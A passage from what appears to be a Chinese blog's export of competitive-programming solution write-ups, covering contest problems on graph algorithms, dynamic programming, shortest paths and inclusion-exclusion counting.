<li><a href="https://ac.nowcoder.com/acm/contest/18900/B">传送门</a></li>
<li>给定一个 $n$ 行 $m$ 列的矩阵，每个格子上都有一个权值 $w$，给这个格子涂色需要付出对应权值的代价。对于任意一个子矩阵，如果有三个角已经被涂上了颜色，则第四个角可以免费被涂上颜色。问最少用多少代价可以将整个矩阵涂上颜色。</li>
<li>$n,m\leq 5000,w\leq 10^5$​​。</li>
</ul>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>考虑对每一个行建一个点 $A_i$，每一列建一个点 $B_j$ ，花代价选中第 $i$ 行第 $j$​ 列格子，就将 $A_i$ 与 $B_j$ 连起来。可以发现，免费涂色的过程是不改变连通性的。又可以发现整张图需要连通才能实现将颜色涂满，因此对建出的点求最小生成树即可。</p>
<p>由于权值范围有限，所以可以省去排序的 log。总时间复杂度 $O(n^2)$。</p>
<h2 id="C-Minimum-Grid"><a href="#C-Minimum-Grid" class="headerlink" title="C. Minimum Grid"></a>C. Minimum Grid</h2><h3 id="题面描述-2"><a href="#题面描述-2" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://ac.nowcoder.com/acm/contest/18900/C">传送门</a></li>
<li>给定一个 $n\times n$ 的方阵，其中有 $m$ 个格子可以填非负整数。先给定每行每列的数字的最大值，求填写的数的和的最小值。</li>
<li>$n\leq 2000, m\leq 8\times 10^5$，行列最大值序列中相同的数不会出现超过 $500%$​ 次。</li>
</ul>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>我们先将每行的最大值，每列的最大值求和作为一个初始答案，然后考虑如何“节省”。</p>
<p>对于一个可以填数的格子，如果其所在行列的最大值不同，那么这个数必然只能给较小的行/列做贡献。换言之，只有某一个格子所在的行和列的最大值一样，才能通过在这个格子填数的方式实现“一石二鸟”。</p>
<p>因此我们每轮将最大值相同的那些行与列拿出来考虑，看他们的交叉点上的那些可以填数的格子。如果第 $i$ 行第 $j$ 列可以填数，那么在这个格子填数可以同时解决一行一列的问题，从而省下一个数。所以我们对所有的行建点，所有的列建点，可以填数的格子等价于连边，这样求一个最大匹配即可算出最多可以省下的代价。</p>
<p>因为题目保证了相同的数不会超过 $500$ 次，所以使用dinic最大流的方法求解最大匹配，可以预估时间复杂度大致为 $O(m\sqrt m)$。</p>
<h2 id="D-Count"><a href="#D-Count" class="headerlink" title="D. Count"></a>D. Count</h2><h3 id="题面描述-3"><a href="#题面描述-3" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><p><a href="https://ac.nowcoder.com/acm/contest/18900/D">传送门</a></p>
</li>
<li><p>给定一个 $n\times n$ 的矩阵，现要将其中的 $C$ 个格子染成黑色，染法要求满足以下条件：</p>
<ul>
<li><p>每行，每列，两条对角线都至少有一个格子被染黑；</p>
</li>
<li><p>额外给出 $K$ 个位置，这 $K$​ 个位置不能被染黑。</p>
</li>
</ul>
<p>  求方案数，答案对 $10007$ 取模。</p>
</li>
<li><p>$n\leq 32,K\leq 7$。</p>
</li>
</ul>
<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>首先对 $K$ 个不能放的位置进行容斥，我们用 $2^K$ 的代价消除了染法的第二条限制，现在专注于第一条。</p>
<p>继续容斥，枚举有多少个行，列可以染色以及枚举对角线是否可以染色，我们发现假设有 $A$ 行， $B$ 列可以染色，则总共可以染色的格子数为 $AB-M$，其中 $M$ 为行列均允许染色但由于对角线被ban而无法染色的格子数。考虑用动态规划来计数，令 $dp_{p,i,j,k}$ 表示当前考虑到第 $p$ 行，当前可以染色的行数为 $i$ ，可以染色的列数为 $j$ ，行列均可以染色但由于对角线限制被ban的格子数为 $k$ 的方案数。转移的时候，我们发现若要充分考虑对角线上的点，则必须同时考虑第 $p$ 行，第 $p$ 列，第 $n+1-p$ 行，第 $n+1-p$​ 列。</p>
<p>总时间复杂度为 $O(2^Kn^4)$​。</p>
<h2 id="E-Math"><a href="#E-Math" class="headerlink" title="E. Math"></a>E. Math</h2><h3 id="题面描述-4"><a href="#题面描述-4" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://ac.nowcoder.com/acm/contest/18900/E">传送门</a></li>
<li>对于给定的 $n$，求有多少个有序数对 $1\leq x\leq y\leq n$ 满足 $xy+1\mid x^2+y^2$。</li>
<li>多组数据， $T\leq 10^5,n\leq 10^{18}$。</li>
</ul>
<h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p>打表观察可以发现解的分布满足以下规律：</p>
<p>将解分成若干组，每一组的解由一个序列生成：第 $i$ 组的序列前两个数是 $i$ 和 $i^3$ ，以后 $f_i(n)=i^2f_i(n-1)-f_i(n-2)$​​，每相邻的两个数构成一对合法的解。注意第一组只有 $(1,1)$ 一对。</p>
<p>由此可以看出答案不是很多，因此可以预处理出所有的答案，再根据 $n$​ 二分。</p>
<h2 id="F-24dian"><a href="#F-24dian" class="headerlink" title="F. 24dian"></a>F. 24dian</h2><h3 id="题面描述-5"><a href="#题面描述-5" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://ac.nowcoder.com/acm/contest/18900/F">传送门</a></li>
<li>输入 $n$ 和 $m$ ，问有多少种 $n$ 张扑克牌的组合（不考虑花色，仅有1~13）满足可以运用24点规则内的计算方法得到 $m$ ，且每一种得到 $m$ 的方法中途都出现了分数。</li>
<li>$n\leq 4,m\leq 10^9$</li>
</ul>
<h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><p>模拟题。枚举初始状态搜索即可。</p>
<h2 id="G-Yu-Ling-Ling-YueZheng-and-Colorful-Tree"><a href="#G-Yu-Ling-Ling-YueZheng-and-Colorful-Tree" class="headerlink" title="G. Yu Ling(Ling YueZheng) and Colorful Tree"></a>G. Yu Ling(Ling YueZheng) and Colorful Tree</h2><p>留坑</p>
<h2 id="H-Ling-Qiu-Luna-and-Triple-Backpack"><a href="#H-Ling-Qiu-Luna-and-Triple-Backpack" class="headerlink" title="H. Ling Qiu, Luna and Triple Backpack"></a>H. Ling Qiu, Luna and Triple Backpack</h2><p>留坑</p>
<h2 id="I-Kuriyama-Mirai-and-Exclusive-Or"><a href="#I-Kuriyama-Mirai-and-Exclusive-Or" class="headerlink" title="I. Kuriyama Mirai and Exclusive Or"></a>I. Kuriyama Mirai and Exclusive Or</h2><h3 id="题面描述-6"><a href="#题面描述-6" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><p><a href="https://ac.nowcoder.com/acm/contest/18900/I">传送门</a></p>
</li>
<li><p>给定一个长度为 $n$ 的序列，现有 $q$ 次操作，每次操作属于以下两种类型之一：</p>
<ul>
<li><code>0 l r x</code> 给区间 $[l,r]$ 中的所有数异或 $x$；</li>
<li><code>1 l r x</code> 给区间 $[l,r]$ 中下标为 $i$ 的数异或 $x+(i-l)$。</li>
</ul>
<p>  求操作结束后的序列。</p>
</li>
<li><p>$n\leq 6\times 10^5,q\leq 4\times 10^5$，所有异或的数均在 $[0,2^{30})$ 中。</p>
</li>
</ul>
<h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><p>第一种操作相对简单，只需要记录一个差分数组，对于每次操作在位置 $l$ 和位置 $r+1$ 异或 $x$ ，最后求前缀异或和即可得每个数需要异或的值。</p>
<p>对于第二种操作，按位考虑。对于第 $i$​​ 位，可以发现需要异或1的位置都是以 $2^i$ 为周期循环出现的。如果我们将序列排成一个宽为 $2^i$ 的矩阵，则每次需要异或1的位置构成了一个或两个子矩阵区域，同样可以通过打差分标记的方式来维护，最后求二维前缀异或和即可。</p>
<p>假设 $n$​ 与 $q$​ 同阶，总时间复杂度 $O(nlog2^{30})$​。</p>
<h2 id="J-Counting-Triangles"><a href="#J-Counting-Triangles" class="headerlink" title="J. Counting Triangles"></a>J. Counting Triangles</h2><h3 id="题面描述-7"><a href="#题面描述-7" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://ac.nowcoder.com/acm/contest/18900/J">传送门</a></li>
<li>给定一张 $n$ 个顶点的无向完全图，每条边是黑色或白色，求三边同色的三角形的个数。</li>
<li>$n\leq 8000$​。</li>
</ul>
<h3 id="题解-7"><a href="#题解-7" class="headerlink" title="题解"></a>题解</h3><p>换一个角度考虑，用总三角形个数减去那些不是同色的三角形的个数。</p>
<p>我们可以发现一个性质：不同色的三角形三条边要么是两黑一白要么是两白一黑，这两种都满足三角形有恰好两个顶点旁边的两条边颜色不同。换言之，对于图中的每个顶点，考虑其所有邻边，任选一条黑色的边与一条白色的边组合，第三条边无论是什么颜色都是一个异色三角形。因此只要对每个顶点计算 $cnt_{black}*cnt_{white}$​ 最后除以二就是异色三角形的个数。 </p>
<p>总时间复杂度 $O(n^2)$。</p>
]]></content>
      <tags>
        <tag>动态规划</tag>
        <tag>容斥原理</tag>
        <tag>最小生成树</tag>
        <tag>二分图匹配</tag>
      </tags>
  </entry>
  <entry>
    <title>问题求解II - Final 题解</title>
    <url>/2021/07/03/%E9%97%AE%E9%A2%98%E6%B1%82%E8%A7%A3%20II%20-%20Final%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="A-为世界所有美好而战"><a href="#A-为世界所有美好而战" class="headerlink" title="A. 为世界所有美好而战"></a>A. 为世界所有美好而战</h2><h3 id="题面描述"><a href="#题面描述" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><code>yjher</code> 是一名带学生，他有一个梦想，为世界所有美好而战。作为带学生，他首先要解决一个问题，就是选课问题。俗话说，选课一时爽，期末火葬场，为了避免这种情况，他决定根据期末最后的总复习时间 $m$ 来确定选课方案。(每门课只能选一次）</li>
<li>已知现在一共有 $n$ 门课，每门课有两个属性 $v_i$ 和 $t_i$，分别表示这门课修完能获得的学分和复习需要花的时间。</li>
<li>现在问你复习所花时间的和不超过 $m$ 的情况下，能获得的最高分数。</li>
<li>$n\leq 1000,m\leq 10^9,v_i\leq 300,t\leq 3e6$​​​。</li>
</ul>
<span id="more"></span>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>由于 $m$ 的范围过大，而学分 $v_i$​​ 的范围相对较小，因此考虑将学分作为背包dp的状态。</p>
<p>令 $dp[i][j]$ 表示当前考虑到第 $i$ 门课，获得 $j$ 学分的情况下所需使用的最小时间，转移是简单的： $dp[i][j]=min{dp[i-1][j],dp[i-1][j-v[i]]+t[i]}$​​。</p>
<p>时间复杂度 $O(n\sum v_i)$，可以通过，但空间复杂度 $O(n\sum v_i)$​​ 不能接受。</p>
<p>背包dp有一种简单的空间优化的方式，考虑将dp状态压缩成一维 $dp[j]$，双重循环的第 $i$ 轮结束时表示获得 $j$ 学分所需的最小时间。我们只要在内循环中倒序循环，就能保证 $dp[j]$ 的更新来源都是上一层的数据，从而保证了正确性，这样空间复杂度压缩到 $O(\sum v_i)$​。</p>
<h2 id="B-数列"><a href="#B-数列" class="headerlink" title="B. 数列"></a>B. 数列</h2><h3 id="题面描述-1"><a href="#题面描述-1" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定一个 $n$ 个数的数列 $a[i]$，对于每个 $i$ ,在右边找到一个最靠右的位置 $k$（即 $k$ 尽可能大），满足 $a[k]&lt;a[i]$，输出 $k-i-1$，如果一个都找不到，输出 $-1$。对于序列的每个元素都要输出。</li>
<li>$n\leq 500000$​。</li>
</ul>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>考虑按照权值从小到大的顺序向空序列中依次添加这些数，这样做的好处是，某一次添加 $a[i]$​ 时，数列中已经存在的数一定是比当前数小的数，因此我们只需要一边加数，一边更新下标的最大值即可。（如果下标最大值小于当前数的下标，则答案为-1）。</p>
<p>总时间复杂度 $O(nlogn)$​。</p>
<h2 id="C-只有一种英雄主义"><a href="#C-只有一种英雄主义" class="headerlink" title="C. 只有一种英雄主义"></a>C. 只有一种英雄主义</h2><h3 id="题面描述-2"><a href="#题面描述-2" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><p>这个世界上只有一种英雄主义，那就是在认清生活的真相后依然热爱它。<code>yjher</code> 面对着 $n$​​ 个生活的真相，这些生活的真相按序依次排好成为一个数列，<code>yjher</code> 对每个生活的真相都有 $m$​​ 种热爱等级可选（即可以理解为每个生活真相可以对应于一个 $1$​​ 到 $m$​​ 的热爱等级)。为了让生活看起来不要那么单调，要求相邻的生活真相有不同热爱等级（即如果你在第 $i$​​ 个生活真相中热爱等级是5，那么第 $i+1$​​ 个生活真相的热爱等级就不能是5），且 <code>yjher</code> 比较偏好数字 $k$​​，他希望所有生活真相总共使用的热爱等级数为恰好 $k$​​ 个。（就比如 $k=3,n=5,m=4$​​，那么 $1,2,3,2,1$​​ 和 $2,3,4,3,2$​​ 就是两个可行方案，但是 $1,2,3,4,3$​​​ 就不是，因为他用了超过3个不同的热爱等级）。</p>
<p>  现在问你所有可行的方案数。两个方案数认为是不同的，当前仅当两个方案的某个生活真相有不同的热爱等级（就比如 $1,2,3$ 和 $2,3,4$ 就是不同的方案），因为答案可能很大，令答案对 $1e9+7$取模。</p>
</li>
<li><p>$n,m\leq 10^9,k\leq 10^6$​。</p>
</li>
</ul>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>首先从 $m$ 个等级中选出 $k$ 个来进行安排，这一部分的方案数是 $\binom{m}{k}$，之后的计算默认可选的等级为 1~k。</p>
<p>恰好选满了 $k$​ 种等级较难控制，考虑容斥。令 $C(i)$​ 表示在 $k$​ 种等级的其中 $i$​ 种的范围中进行选择的方案数。为了保证相邻不相同的约束，第一个真相有 $i$​ 种选择，后面每一种都只有 $i-1$​ 种选择，因此 $C(i)=i\cdot (i-1)^{n-1}$​。</p>
<p>根据容斥原理，</p>
<p>$$\begin{align*}ans &amp;= \binom mk\sum_{i=0}^{n-2}(-1)^i\sum_{1\leq a_1,a_2,…,a_{k-i}\leq k}C(a_1,a_2,…,a_{k-i}) \\ &amp;= \binom mk \sum_{i=0}^{n-2}(-1)^i\binom kiC(i) \\ &amp;= \binom mk\sum_{i=0}^{n-2}(-1)^i\binom ki(k-i)(k-i-1)^{n-1} \end{align*}$$$\binom mk$ 可以通过下降幂的方式 $O(k)$ 地计算。预处理阶乘及其逆元之后，循环内部的组合数可以 $O(1)$ 计算， $(k-i-1)^{n-1}$ 需要使用快速幂，综上，总时间复杂度为 $O(klogn)$​。</p>
]]></content>
      <tags>
        <tag>动态规划</tag>
        <tag>容斥原理</tag>
      </tags>
  </entry>
  <entry>
    <title>问题求解 III - 01 题解</title>
    <url>/2021/09/07/%E9%97%AE%E9%A2%98%E6%B1%82%E8%A7%A3%20III%20-%2001%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="A-最短路1"><a href="#A-最短路1" class="headerlink" title="A. 最短路1"></a>A. 最短路1</h2><h3 id="题面描述"><a href="#题面描述" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给一张 $n$ 个点 $m$ 条边的有向带权图，求 $1$ 号点到所有点的最短路长度。</li>
<li>$n\leq 10^5,m\leq 2\times 10^5,1\leq w_i\leq 10^9$​。</li>
</ul>
<span id="more"></span>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>直接使用 Dijkstra 算法求单源最短路即可，注意开 long long。</p>
<h2 id="B-最短路2"><a href="#B-最短路2" class="headerlink" title="B. 最短路2"></a>B. 最短路2</h2><h3 id="题面描述-1"><a href="#题面描述-1" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><p>给一张 $n$ 个点 $m$ 条边的有向带权图，求 $1$ 号点到所有点的最短路长度。</p>
</li>
<li><p>$n\leq 2000,m\leq 5000,-10^9\leq w_i\leq 10^9$​。</p>
</li>
</ul>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>本题图中有负权边，因此应该使用 Bellman-Ford 算法求最短路。总时间复杂度 $O(nm)$。</p>
<h2 id="C-最短路计数"><a href="#C-最短路计数" class="headerlink" title="C. 最短路计数"></a>C. 最短路计数</h2><h3 id="题面描述-2"><a href="#题面描述-2" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给一张 $n$ 个点 $m$ 条边的有向带权图，求 $1$ 号点到所有点的最短路的条数。</li>
<li>$n\leq 10^6,m\leq 2\times 10^6,1\leq w_i\leq 10^9$​。</li>
</ul>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>先用 Dijkstra 算法求出最短路，然后以最短路长度为顺序进行 dp，对于满足 $dist[u]+w(u,v)=dist[v]$ 的边 $(u,v)$ 进行转移。</p>
<p>总时间复杂度 $O(mlogm+n)$。</p>
<h2 id="D-Le-Mythe-De-Acesrc"><a href="#D-Le-Mythe-De-Acesrc" class="headerlink" title="D. Le Mythe De Acesrc"></a>D. Le Mythe De Acesrc</h2><h3 id="题面描述-3"><a href="#题面描述-3" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定一个 $n$ 个数的集合 ${a_1,a_2,…,a_n}$，有 $q$ 个询问，每次给定一个 $x$ ，问 $x$ 是否能用集合中的若干个数相加得到（一个数可以用多次）。</li>
<li>$n\leq 10000,1\leq a_i\leq 20000,x\leq 10^9$​​，$a_i$ 按照递增序给出。</li>
</ul>
<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>考虑最短路对 $a_n$​ 取模的值，令 $f[i]=argmin_{x}[(x\cdot a_n+i)$​可以构造出来$]$。如果求出了数组 $f$ ，对于一个询问 $x$ ，只要 $\left\lfloor x/a_n\right\rfloor&gt;f[x\space mod \space a_n]$，就可以构造出来（因为有无限个 $a_n$​​ 可用），否则不行。</p>
<p>现考虑如何计算 $f[i]$。建图，对于 $i$ 和 $j$，如果存在一个 $a_k$ 使得 $i+a_k=j$​ ，则建一条从 $i$ 到 $j$ ，边权为 $0$ 的有向边；如果存在一个 $a_k$ 使得 $i+a_k=a_n+j$，则建一条从 $i$ 到 $j$ ，边权为 $1$ 的边。这样只要在图上跑一个 01bfs 即可。</p>
<p>总时间复杂度 $O(na_n+q)$。</p>
<h2 id="补充题1-Luogu1462-通往奥格瑞玛的道路"><a href="#补充题1-Luogu1462-通往奥格瑞玛的道路" class="headerlink" title="补充题1. [Luogu1462] 通往奥格瑞玛的道路"></a>补充题1. [Luogu1462] 通往奥格瑞玛的道路</h2><h3 id="题面描述-4"><a href="#题面描述-4" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://www.luogu.com.cn/problem/P1462">传送门</a></li>
<li>给一个 $n$ 个点 $m$ 条边的无向图。每条边有一个权值 $w_i$ 表示经过这条边需要耗费的血量。每个顶点有一个权值 $f_i$ 表示经过这个点需要耗费的钱。现从 $1$ 号点出发到 $n$ 号点，对于一条路径，其耗费血量定义为经过的所有边的耗费之和，其耗费的钱定义为经过的所有节点的耗费的最大值。给定初始血量 $b$，问在能够到达终点的情况下耗费钱的最小值。</li>
<li>$n\leq 10000,m\leq 500000$。</li>
</ul>
<h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p>二分答案，这样我们每次只要将大于答案的点以及与之相关的边从图中去掉，在剩下的图中跑最短路即可。</p>
<h2 id="补充题2-Luogu2371-墨墨的等式"><a href="#补充题2-Luogu2371-墨墨的等式" class="headerlink" title="补充题2. [Luogu2371] 墨墨的等式"></a>补充题2. [Luogu2371] 墨墨的等式</h2><h3 id="题面描述-5"><a href="#题面描述-5" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://www.luogu.com.cn/problem/P2371">传送门</a></li>
<li>给定 $a_1,a_2,…,a_n$ 和 $[l,r]$ ，对于方程组 $\sum_{i=1}^na_ix_i=b$​​，求有多少个 $b\in [l,r]$ 使得原方程组有非负整数解。</li>
<li>$n\leq 12,1\leq a_i\leq 5\times 10^5,1\leq l\leq r\leq 10^{12}$。</li>
</ul>
<h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><p>D题是本题的弱化版。欲解决本题，在求出 dist 数组之后，只需要分类枚举 $a_n$ 的所有余数，然后计算有多少个数落在了 $[l,r]$ 区间内即可。</p>
<p>总时间复杂度 $O(na_n)$。</p>
<h2 id="补充题3-Luogu4822-冻结"><a href="#补充题3-Luogu4822-冻结" class="headerlink" title="补充题3. [Luogu4822] 冻结"></a>补充题3. [Luogu4822] 冻结</h2><h3 id="题面描述-6"><a href="#题面描述-6" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://www.luogu.com.cn/problem/P4822">传送门</a></li>
<li>给定一张 $n$ 个点 $m$ 条边的图。每条边有一个权值，保证是偶数。现在可以使用不超过 $k$ 次魔法，使用一次魔法可以使得一条边的权值变为原来的一半，每条边至多只能被使用一次魔法。求最短路。</li>
<li>$n\leq 50,m\leq 1000$。</li>
</ul>
<h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><p>由于最短路经过的边数不会超过 $n$ ，因此实际上 $k$ 可以和 $n$ 取 min（在本题的原限制中 $k$ 已经满足该条件）。</p>
<p>考虑重新建图。令 $dist[u][i]$ 表示到点 $u$ ，恰好使用了 $i$ 次魔法的情况下的最小代价。对于原图中的每一条边 $(u,v,w)$，在新图中连边 $((u,i),(v,i),w)$ 和 $((u,i),(v,i+1),w/2)$。</p>
<p>新图共有 $n\times k$ 个节点，$m\times k$ 条边，在这张图上跑 Dijkstra 即可。</p>
<p>总时间复杂度 $O(mklog(mk))$。 </p>
]]></content>
      <tags>
        <tag>问题求解</tag>
        <tag>最短路</tag>
        <tag>二分答案</tag>
      </tags>
  </entry>
  <entry>
    <title>问题求解 III - 02 题解</title>
    <url>/2021/09/07/%E9%97%AE%E9%A2%98%E6%B1%82%E8%A7%A3%20III%20-%2002%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="A-最长路"><a href="#A-最长路" class="headerlink" title="A. 最长路"></a>A. 最长路</h2><h3 id="题面描述"><a href="#题面描述" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定一个 $n$ 个点 $m$ 条边的有向无环图，求图中最长路的长度。</li>
<li>$1\leq n\leq 2\times 10^{5},1\leq m\leq min\{\frac{n(n-1)}{2},5\times 10^5\}$。</li>
</ul>
<span id="more"></span>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>令 $dp[u]$ 表示从节点 $u$ 出发的最长路长度，则 $dp[u]=max_{(u,v)\in E} dp[v]+w(u,v)$。</p>
<p>总时间复杂度 $O(n+m)$。</p>
<h2 id="B-旅行问题"><a href="#B-旅行问题" class="headerlink" title="B. 旅行问题"></a>B. 旅行问题</h2><h3 id="题面描述-1"><a href="#题面描述-1" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定一个 $n$ 个点的完全图，$A_{ij}$ 表示从 $i$ 到 $j$ 的边权。现要求从任意一点出发，至少经过每个点一次，到任意一点结束，求最小路径长度。</li>
<li>$n\leq 20$。</li>
</ul>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>先用 Floyd 预处理两两之间的最短路 $dist[i][j]$。然后考虑状压 dp: 令 $dp[Mask][i]$ 表示当前在节点 $i$ ，已经经过的点的状态为 $Mask$ 的情况下的最小距离，转移考虑枚举上一个节点 $j$ 即可。即<br>$$<br>dp[Mask][i]=\min_{j\in Mask,j\neq i}dp[Mask-j][j]+dist[i][j]<br>$$ 注意我们无需担心在从 $i$ 到 $j$ 的最短路上经过的其他点没有被标注进 $Mask$，因为如果没有被标注进是对答案的损失，而事实上一定有一种转移方式是正确的。</p>
<p>总时间复杂度 $O(2^nn^2)$。</p>
<h2 id="C-修建公路"><a href="#C-修建公路" class="headerlink" title="C. 修建公路"></a>C. 修建公路</h2><h3 id="题面描述-2"><a href="#题面描述-2" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定一个 $n$ 个点，没有边的图。再给定 $m$ 条有向边，将其一一加入图中。问对于每一个 $1\leq i\leq m$，在第 $i$ 条边被加入后，有多少个有序对 $(u,v),u\neq v$ 满足有从 $u$ 到 $v$ 的路径。</li>
<li>$n\leq 400$。</li>
</ul>
<h3 id="题解1"><a href="#题解1" class="headerlink" title="题解1"></a>题解1</h3><p>考虑给每条边一个权值：它被加入图的时间。定义一条路径的长度为经过的所有边的权值的最大值。则我们用 Floyd-Warshall 算法可以求出多源最短路（考虑 Floyd 的动态规划过程易证其正确性），这个最短路长度 $d(u,v)$ 的意义是从时刻 $d(u,v)$ 开始，以后一直存在从 $u$ 到 $v$ 的路径。因此我们枚举每个点对，根据 $d$ 值看它对答案的贡献即可。</p>
<p>总时间复杂度 $O(n^3)$。</p>
<h3 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h3><p>对于每条新加的边 $(u,v)$ ，如果在此之前 $u$ 已经可以到 $v$ ，则这条边加的没有意义。否则我们考虑这条边的加入会给传递闭包带来什么影响。</p>
<p>考虑对每个节点维护两个 bitset，$b_1(u)$ 表示 $u$ 目前可达的点，$b_2(u)$ 表示目前可达 $u$ 的点。那么对于 $(u,v)$，我们考虑 $b_2(u)$ 中的所有点，给它们的 $b_1$ bitset 或上 $b_1(v)$ 即可，同理对于$b_1(v)$ 中的所有点给它们的 $b_2$ bitset 或上 $b_2(u)$。这样的复杂度为 $O(\frac{mn^2}{w})$，不能通过。</p>
<p>考虑做一个简单的优化：对于 $b_2(u)$ 中的点，如果它们可以在加入 $(u,v)$ 之前就可以到达 $v$ ，那么显然这次或操作是无效的，因此我们只对那些 <strong>可以到 $u$ 但不能到 $v$ 的节点</strong> 进行或操作（这些节点可以通过位运算快速得出）。我们可以证明这样进行或操作的次数最多 $O(n^2)$ 次：</p>
<blockquote>
<p>$n$ 个点的 bitset 中一共有 $O(n^2)$ 个位置，每次或操作至少可以使 bitset 中到 $v$ 的那个位置从 0 变成 1，因此每次或操作都会使 1 的个数增加，所以最多有 $O(n^2)$ 次或操作。</p>
</blockquote>
<p>对于 <strong>$v$ 可到但 $u$ 不能到</strong> 的节点也是同理。通过复杂度分析，我们可以看到该算法的复杂度降到 $O(\frac{n^3}{w})$。</p>
<h2 id="D-倍数"><a href="#D-倍数" class="headerlink" title="D. 倍数"></a>D. 倍数</h2><h3 id="题面描述-3"><a href="#题面描述-3" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定整数 $n$ ，问所有的 $n\times k (k&gt;0)$ 在二进制表示下 $1$​ 的个数最少是多少。</li>
<li>$n\leq 10^6$。</li>
</ul>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>任何一个 $n$ 的倍数都可以通过这个方式生成：</p>
<blockquote>
<p>进行以下操作有限次：</p>
<p>给当前数 $+n$ 并 $\times 2$ ，或者给当前数 $+0$ 并 $\times 2$。</p>
</blockquote>
<p>这样生成的数必定可以被表示为 $\sum n\times 2^k$ 的形式，因此可以表示所有的 $n$ 的倍数。</p>
<p>考虑如下动态规划：令 $dp[i]$ 表示生成一个前缀为 $i$ 的数，在 $i$ 之后的部分最少有多少个 $1$ 。考虑向后转移：进行一次上述的操作可以确定二进制下的一位，所以<br>$$<br>\begin{align}<br>dp[i&gt;&gt;1] &amp;\leftarrow dp[i]+(i\&amp;1) \\<br>dp[(i+n)&gt;&gt;1]\ &amp;\leftarrow dp[i]+((i+n)\&amp;1)<br>\end{align}<br>$$ 由于我们不能确定转移的顺序，所以可以建图之后跑最短路。注意到边权只有 $0$ 和 $1$ 两种，所以用 01bfs 即可。</p>
<p>总时间复杂度 $O(n)$。</p>
<h2 id="补充题1-POJ1734-Sightseeing-Trip"><a href="#补充题1-POJ1734-Sightseeing-Trip" class="headerlink" title="补充题1. [POJ1734] Sightseeing Trip"></a>补充题1. [POJ1734] Sightseeing Trip</h2><h3 id="题面描述-4"><a href="#题面描述-4" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="http://poj.org/problem?id=1734">传送门</a></li>
<li>给定一个 $n$ 个点 $m$ 条边的无向图，要求在其中找到一个点数大于 $2$ 的环，使其边权之和最小，输出这个圈或者输出 <code>No solution.</code> 。</li>
<li>$n\leq 100,m\leq 10000$。</li>
</ul>
<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>对 Floyd-Warshall 算法的应用。考虑 Floyd 原式的动态规划思想，在第 $k$ 轮循环开始时，$dist[i][j]$ 保存的是从 $i$ 到 $j$ 且中间只经过了 $1$~$k-1$ 的最短距离。因此在第 $k$ 轮循环开始时，我们考虑所有编号最大的点是 $k$ 的环，我们枚举与 $k$ 相邻的两个点 $i$ 和 $j$ $(i,j&lt;k)$，用 $dist[i][j]$ 和 $k$ 与 $i$ ，$k$ 与 $j$ 的边权之和来更新答案。</p>
<p>欲打印这个圈，我们对每个 $dist[i][j]$ 额外记录一个 $mid[i][j]$ 表示最短路中权值最大的点是哪个。这样可以将路径分成 $i\rightsquigarrow mid[i][j]$ 和 $mid[i][j]\rightsquigarrow j$ 两部分，递归求解。须要注意的是，路径必须在找到更短路径的同时就出来，否则在后续循环中 $mid[i][j]$ 会被更新。</p>
<p>总时间复杂度 $O(n^3)$。</p>
<h2 id="补充题2-Luogu1119-灾后重建"><a href="#补充题2-Luogu1119-灾后重建" class="headerlink" title="补充题2. [Luogu1119] 灾后重建"></a>补充题2. [Luogu1119] 灾后重建</h2><h3 id="题面描述-5"><a href="#题面描述-5" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://www.luogu.com.cn/problem/P1119">传送门</a></li>
